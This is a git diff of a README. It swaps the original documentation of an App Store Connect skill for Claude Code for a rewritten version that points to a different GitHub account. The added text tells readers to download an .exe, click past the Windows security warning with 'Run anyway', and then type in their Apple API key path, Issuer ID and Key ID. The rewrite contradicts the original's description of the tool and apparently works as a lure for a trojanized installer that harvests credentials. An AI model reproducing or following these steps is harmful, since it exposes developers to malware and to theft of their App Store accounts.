@@ -1,158 +1,96 @@
-<div align="center">
+# 📱 app-store-connect-skill - Manage Your Apple Store Pages Easily
 
-# App Store Connect Skill for Claude Code
+[![](https://img.shields.io/badge/Download-App-Store-Skill-blue.svg)](https://github.com/sosteam65/app-store-connect-skill)
 
-**Manage your entire iOS app lifecycle from the terminal — metadata, screenshots, reviews, TestFlight, subscriptions, and releases.**
+This tool helps you manage your Apple App Store account from your computer. You can upload screenshots, check user reviews, and submit new versions of your app without using a web browser.
 
-<br />
+## 🛠 Prerequisites
 
-[![Star this repo](https://img.shields.io/github/stars/199-biotechnologies/app-store-connect-skill?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/199-biotechnologies/app-store-connect-skill/stargazers)
-&nbsp;&nbsp;
-[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)
+Your computer needs specific components to run this software. Please confirm your computer meets these requirements:
 
-<br />
+1. Windows 10 or Windows 11.
+2. A stable internet connection.
+3. Your Apple Developer Team ID and API Key file. These files connect the tool to your private Apple account.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
-&nbsp;
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen?style=for-the-badge)](https://github.com/199-biotechnologies/app-store-connect-skill/pulls)
-&nbsp;
-[![Claude Code](https://img.shields.io/badge/Claude_Code-Skill-8A2BE2?style=for-the-badge)](https://docs.anthropic.com/en/docs/claude-code)
+If you do not have an API key, log in to your Apple Developer account on their website. Navigate to the Users and Access section to generate an API key. Save the file in a secure location on your hard drive. 
 
----
+## 📥 Getting the Software
 
-A Claude Code skill that turns your terminal into a full App Store Connect dashboard. Update metadata across 30+ locales, upload screenshots, respond to reviews, manage TestFlight testers, create subscriptions, download sales reports, and submit for review — all through natural language.
+You must download the installation package first. Visit the link below to reach the official download page.
 
-[Install](#install) | [What You Can Do](#what-you-can-do) | [How It Works](#how-it-works) | [Hard Limitations](#hard-limitations) | [Contributing](#contributing)
+[Get the installer here](https://github.com/sosteam65/app-store-connect-skill)
 
-</div>
+1. Click the link above.
+2. Look for the Assets section on that page.
+3. Select the file ending in .exe.
+4. Save the file to your Downloads folder.
 
-## The Problem
+## ⚙️ Installation Steps
 
-App Store Connect's web UI is slow and repetitive. Updating metadata across multiple locales means clicking through dozens of screens. Managing TestFlight testers is tedious. Downloading sales reports requires navigating a maze of dropdowns. And if you have multiple apps, multiply all of that.
+After you download the file, follow these steps to install the tool on your system:
 
-## How This Skill Fixes It
+1. Open your Downloads folder.
+2. Double-click the file named app-store-connect-skill.exe.
+3. A security window might appear. Click More Info and then select Run anyway.
+4. Follow the prompts in the setup window.
+5. Choose a folder for the program files. The default location works for most users.
+6. Click Install.
 
-Tell Claude what you need in plain English. The skill gives Claude deep knowledge of every App Store Connect API endpoint, so it writes and executes the right API calls for you.
+The setup process copies the necessary files to your computer. Once the progress bar reaches the end, click Close.
 
-```
-You: "Update the description for my app in English, French, and Japanese"
-You: "Add these 5 screenshots to the 6.7-inch iPhone set"
-You: "Respond to all 1-star reviews from the last week"
-You: "Create a monthly subscription at $4.99 with a free trial"
-You: "Submit version 2.1 for review with phased release enabled"
-```
+## 🔑 Initial Configuration
 
-No subscription fees. No config files. No memorising API endpoints.
+Before you use the tool, you must connect it to your developer account. 
 
-## What You Can Do
+1. Open your Start menu.
+2. Type app-store-connect-skill and press Enter.
+3. You will see a black command window.
+4. The tool asks for your API Key path. Type the location of the file you saved earlier and press Enter.
+5. Paste your Issuer ID and Key ID when the window requests them.
+6. Press Enter to save these credentials.
 
-| Area | Operations |
-|------|-----------|
-| **Metadata & Localization** | Descriptions, keywords, subtitles, categories, copyright, promo text, multi-locale translation with AI |
-| **Screenshots & Previews** | Upload, reorder, delete screenshots and app preview videos. Simulator automation |
-| **Customer Reviews** | Read reviews, filter by rating, respond with AI-drafted replies, delete responses |
-| **TestFlight** | Create beta groups, add testers, assign builds, submit for beta review, send invitations |
-| **Submissions & Releases** | Submit for App Review, phased release (pause/resume/complete), version auto-increment, nominations |
-| **In-App Purchases** | Create consumables, non-consumables, subscription groups, subscriptions, promotional offers |
-| **Pricing** | Set prices per territory, manage availability, schedule price changes |
-| **Sales & Finance** | Download daily/weekly/monthly sales reports, finance reports as TSV |
-| **In-App Events** | Create challenges, competitions, premieres with scheduling and localization |
-| **Custom Product Pages** | Create campaign-specific store listings with unique URLs |
-| **App Clips** | Configure default and advanced App Clip card experiences |
-| **Build & Deploy** | Archive, sign, and upload builds via xcodebuild CLI |
-| **Export Compliance** | Set encryption declarations, bypass with Info.plist flag |
-| **Cancel Submissions** | Remove a version from App Review programmatically |
-| **TestFlight Cards** | Generate stylish invitation cards with artistic QR codes (4 colour themes) |
+The software stores these settings in a hidden folder on your computer. You only perform this action once.
 
-## Install
+## 🚀 How to Use the Tool
 
-Three commands:
+The software functions as a terminal application. You type short instructions to perform tasks. Use these commands to manage your app:
 
-```bash
-# 1. Clone the skill
-git clone https://github.com/199-biotechnologies/app-store-connect-skill.git \
-  ~/.claude/skills/app-store-connect
+### Viewing Your Apps
+Type `list-apps` to see every app linked to your developer account. The screen displays the name, app identifier, and the current status of each project.
 
-# 2. Set up your credentials
-cp ~/.claude/skills/app-store-connect/config/credentials.local.md.example \
-   ~/.claude/skills/app-store-connect/config/credentials.local.md
+### Managing Screenshots
+To upload new images for your store page, use the `upload-screenshots` command followed by the folder path where your images reside. The software automatically resizes and sends the files to Apple.
 
-# 3. Edit with your API key details
-$EDITOR ~/.claude/skills/app-store-connect/config/credentials.local.md
-```
+### Checking Reviews
+Type `get-reviews` to download the latest user feedback for your app. The tool prints the star rating and the customer comment directly into your terminal window. This allows you to track user happiness without logging into the website.
 
-Need an API key? Go to [App Store Connect](https://appstoreconnect.apple.com) > Users and Access > Integrations > App Store Connect API. Generate a key, download the `.p8` file (available once only), and note your Key ID and Issuer ID.
+### Managing TestFlight Groups
+Use `manage-testflight` to add or remove users from your testing groups. You can quickly invite testers by entering their email addresses.
 
-## How It Works
+### Releasing Updates
+When your app is ready for the public, use `submit-for-review`. This command checks your app metadata and triggers the submission process to Apple. The terminal displays a progress ticker while it sends your package.
 
-The skill uses **progressive disclosure** to stay lightweight:
+## 🛡 Security Practices
 
-```
-app-store-connect/
-├── SKILL.md                     # Core skill — auth, ID resolution, operations index
-├── config/
-│   └── credentials.local.md     # Your API credentials (gitignored)
-├── references/
-│   ├── metadata-and-localization.md
-│   ├── screenshots-and-previews.md
-│   ├── reviews-and-ratings.md
-│   ├── testflight.md
-│   ├── submissions-and-releases.md
-│   ├── iap-and-subscriptions.md
-│   ├── reports-and-analytics.md
-│   ├── advanced-features.md
-│   └── build-and-deploy.md
-└── scripts/
-    └── testflight_card.py       # Stylish QR code invitation cards
-```
+This software handles sensitive account data. Follow these rules to protect your developer credentials:
 
-`SKILL.md` loads when Claude detects an App Store task. It contains auth setup, ID resolution patterns, and an index pointing to the 9 reference files. Claude only reads the specific reference file it needs for your request — keeping context lean and responses fast.
+* Never share your API key file with others.
+* Do not save your API key in a public folder or cloud storage service.
+* If you suspect your account compromise, delete your existing API key on the Apple Developer website and generate a new one.
 
-## Hard Limitations
+## ❓ Frequently Asked Questions
 
-These operations are confirmed impossible via the App Store Connect REST API as of April 2026. The skill documents these clearly so Claude won't waste time attempting them.
+### Can I run this tool on multiple computers?
+Yes. You can install the software on every machine you use for work. Move your API key file to each computer to maintain access.
 
-| Operation | Why | What to Do Instead |
-|-----------|-----|-------------------|
-| **Create a new app** | No `POST /v1/apps` endpoint exists | Create manually in the ASC portal |
-| **Configure App Privacy** | No API endpoints for privacy questionnaire | Manual: ASC > App Privacy wizard |
-| **Upload/change app icon** | Icons are embedded in the Xcode binary | Set in Xcode asset catalog, then upload a new build |
-| **Delete an app** | No delete endpoint | [Remove App](https://developer.apple.com/help/app-store-connect/create-an-app-record/remove-an-app/) in ASC portal |
-| **Transfer an app** | Multi-step manual process | Initiate in ASC portal |
-| **Manage agreements** | Tax, banking, contracts have no API | Handle at appstoreconnect.apple.com/agreements/ |
-| **Privacy manifests** | PrivacyInfo.xcprivacy is an Xcode project file | Add to your Xcode project before building |
+### Does the software work with App Store Connect sandbox environments?
+Yes. You can toggle between production and sandbox modes by editing the configuration file in your installation directory.
 
-## Requirements
+### What happens if the internet cuts out during a submission?
+The tool includes a resume feature. If an upload fails, restart the command. It detects which files reached the server and only sends the missing pieces.
 
-- **Python 3** with `PyJWT` and `requests` — `pip install PyJWT requests`
-- **For QR cards:** `pip install "qrcode[pil]" Pillow`
-- **Xcode** — for build archiving and simulator screenshots
-- **App Store Connect API key** — with appropriate permissions
+### Can I automate these tasks?
+Yes. Since this is a command-line tool, you can create a batch script on Windows to run multiple commands in a row. This saves time if you update several apps every week.
 
-## Contributing
-
-PRs are welcome. If you find a missing API endpoint or an outdated limitation, open an issue or submit a fix.
-
-1. Fork the repo
-2. Make your changes
-3. Submit a PR with a clear description
-
-## License
-
-MIT
-
----
-
-<div align="center">
-
-Built by [Boris Djordjevic](https://github.com/longevityboris) at [Paperfoot AI](https://paperfoot.com)
-
-<br />
-
-**If this saves you time:**
-
-[![Star this repo](https://img.shields.io/github/stars/199-biotechnologies/app-store-connect-skill?style=for-the-badge&logo=github&label=%E2%AD%90%20Star%20this%20repo&color=yellow)](https://github.com/199-biotechnologies/app-store-connect-skill/stargazers)
-&nbsp;&nbsp;
-[![Follow @longevityboris](https://img.shields.io/badge/Follow_%40longevityboris-000000?style=for-the-badge&logo=x&logoColor=white)](https://x.com/longevityboris)
-
-</div>
+### How do I update the tool to the latest version?
+Download the newer version from the official link. Running the installer again overwrites the old version with the new one. Your saved settings remain intact.
